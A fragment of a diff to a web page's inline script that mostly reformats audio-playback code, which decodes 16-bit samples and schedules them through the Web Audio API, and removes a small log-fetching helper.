-                for (let i = 0; i < bin.length; i += 2) bytes[i / 2] = (bin.charCodeAt(i + 1) << 8) | bin.charCodeAt(i);
+                for(let i=0; i<bin.length; i+=2) bytes[i/2] = (bin.charCodeAt(i+1) << 8) | bin.charCodeAt(i);
                 const floats = new Float32Array(bytes.length);
-                for (let i = 0; i < bytes.length; i++) floats[i] = bytes[i] / 32768.0;
+                for(let i=0; i<bytes.length; i++) floats[i] = bytes[i] / 32768.0;
                 const buf = audioCtx.createBuffer(1, floats.length, 16000);
                 buf.copyToChannel(floats, 0); const src = audioCtx.createBufferSource();
                 src.buffer = buf; src.connect(audioCtx.destination);
-                const now = audioCtx.currentTime; if (nextStartTime < now) nextStartTime = now + 0.05;
+                const now = audioCtx.currentTime; if(nextStartTime < now) nextStartTime = now + 0.05;
                 src.start(nextStartTime); nextStartTime += buf.duration;
-            } catch (e) { }
+            } catch(e) {}
         }
-        function fetchLogs(type) { cmd('getLogs', { type, limit: 50, offset: 0 }); }
         function showPage(id) {
             document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
             document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
@@ -814,5 +340,4 @@
         }
     </script>
 </body>
-
 </html>
